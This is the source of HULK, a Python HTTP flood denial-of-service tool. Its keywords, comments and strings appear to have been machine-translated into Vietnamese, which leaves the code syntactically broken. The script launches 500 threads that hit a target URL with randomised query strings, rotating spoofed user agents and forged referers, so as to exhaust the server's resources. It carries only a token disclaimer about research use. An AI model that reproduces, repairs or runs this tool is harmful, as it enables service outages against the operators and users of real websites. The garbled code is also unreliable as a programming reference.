# ------------------------------------------------- ---------------------------------------------
# HULK - Vua tải không thể chịu được HTTP
#
# công cụ này là một công cụ dos có nghĩa là đặt tải nặng lên các máy chủ HTTP để mang chúng
# đầu gối của họ bằng cách cạn kiệt nguồn tài nguyên, nó chỉ dành cho mục đích nghiên cứu
# và bất kỳ việc sử dụng độc hại nào đối với công cụ này đều bị cấm.
#
# tác giả: Barry Shteiman, phiên bản 1.0
# ------------------------------------------------- ---------------------------------------------
nhập urllib2
nhập hệ thống
nhập luồng
nhập ngẫu nhiên
nhập lại

#global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
cờ = 0
an toàn = 0

def inc_counter ():
	request_counter toàn cầu
	request_counter + = 1

def set_flag (val):
	cờ toàn cầu
	cờ = val

def set_safe ():
	an toàn toàn cầu
	an toàn = 1
	
# tạo mảng tác nhân người dùng
def useragent_list ():
	global headers_useragents
	headers_useragents.append ('Mozilla / 5.0 (X11; U; Linux x86_64; en-US; rv: 1.9.1.3) Gecko / 20090913 Firefox / 3.5.3')
	headers_useragents.append ('Mozilla / 5.0 (Windows; U; Windows NT 6.1; en; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append ('Mozilla / 5.0 (Windows; U; Windows NT 5.2; en-US; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append ('Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.1.1) Gecko / 20090718 Firefox / 3.5.1')
	headers_useragents.append ('Mozilla / 5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit / 532.1 (KHTML, như Gecko) Chrome / 4.0.219.6 Safari / 532.1')
	headers_useragents.append ('Mozilla / 4.0 (tương thích; MSIE 8.0; Windows NT 6.1; WOW64; Trident / 4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append ('Mozilla / 4.0 (tương thích; MSIE 8.0; Windows NT 6.0; Trident / 4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0. 30729) ')
	headers_useragents.append ('Mozilla / 4.0 (tương thích; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident / 4.0)')
	headers_useragents.append ('Mozilla / 4.0 (tương thích; MSIE 8.0; Windows NT 5.1; Trident / 4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append ('Mozilla / 5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append ('Mozilla / 4.0 (tương thích; MSIE 6.1; Windows XP)')
	headers_useragents.append ('Opera / 9.80 (Windows NT 5.2; U; ru) Presto / 2.5.22 Version / 10.51')
	return (headers_useragents)

# tạo một mảng tham chiếu
def referencer_list ():
	global headers_referers
	headers_referers.append ('http://www.google.com/?q=')
	headers_referers.append ('http://www.usatoday.com/search/results?q=')
	headers_referers.append ('http://engadget.search.aol.com/search?q=')
	headers_referers.append ('http: //' + host + '/')
	return (headers_referers)
	
#builds chuỗi ascii ngẫu nhiên
def buildblock (kích thước):
	out_str = ''
	cho tôi trong phạm vi (0, kích thước):
		a = random.randint (65, 90)
		out_str + = chr (a)
	return (out_str)

cách sử dụng def ():
	in '------------------------------------------------ --- '
	in 'USAGE: python hulk.py <url>'
	print ', bạn có thể thêm "safe" vào sau url, để autoshut sau khi dos'
	in '------------------------------------------------ --- '

	
#http yêu cầu
def httpcall (url):
	useragent_list ()
	Referencer_list ()
	mã = 0
	nếu url.count ("?")> 0:
		param_joiner = "&"
	khác:
		param_joiner = "?"
	request = urllib2.Request (url + param_joiner + buildblock (random.randint (3,10)) + '=' + buildblock (random.randint (3,10)))
	request.add_header ('Tác nhân người dùng', random.choice (headers_useragents))
	request.add_header ('Cache-Control', 'no-cache')
	request.add_header ('Tập ký tự chấp nhận', 'ISO-8859-1, utf-8; q = 0,7, *; q = 0,7')
	request.add_header ('Người giới thiệu', random.choice (headers_referers) + buildblock (random.randint (5,10)))
	request.add_header ('Keep-Alive', random.randint (110,120))
	request.add_header ('Kết nối', 'duy trì hoạt động')
	request.add_header ('Máy chủ', máy chủ)
	thử:
			urllib2.urlopen (yêu cầu)
	ngoại trừ urllib2.HTTPError, e:
			#print e.code
			set_flag (1)
			in 'Mã phản hồi 500'
			mã = 500
	ngoại trừ urllib2.URLError, e:
			#print e.reason
			sys.exit ()
	khác:
			inc_counter ()
			urllib2.urlopen (yêu cầu)
	trở lại (mã)		

	
#http chuỗi người gọi
lớp HTTPThread (threading.Thread):
	def run (tự):
		thử:
			trong khi cờ <2:
				code = httpcall (url)
				if (mã == 500) & (safe == 1):
					set_flag (2)
		ngoại trừ Exception, ví dụ:
			đi qua

# giám sát chuỗi http và đếm yêu cầu
class MonitorThread (threading.Thread):
	def run (tự):
		trước = request_counter
		trong khi cờ == 0:
			if (+ 100 <request_counter trước) & (trước <> request_counter):
				in "% d yêu cầu đã gửi"% (request_counter)
				trước = request_counter
		nếu cờ == 2:
			print "\ n-- Đã kết thúc cuộc tấn công HULK -"

#hành hình
nếu len (sys.argv) <2:
	cách sử dụng()
	sys.exit ()
khác:
	if sys.argv [1] == "help":
		cách sử dụng()
		sys.exit ()
	khác:
		print "- Đã bắt đầu tấn công HULK -"
		if len (sys.argv) == 3:
			if sys.argv [2] == "safe":
				set_safe ()
		url = sys.argv [1]
		if url.count ("/") == 2:
			url = url + "/"
		m = re.search ('(https? \: //)? ([^ /] *) /?.*', url)
		host = m.group (2)
		cho tôi trong phạm vi (500):
			t = HTTPThread ()
			t.start ()
		t = MonitorThread ()
		t.start ()
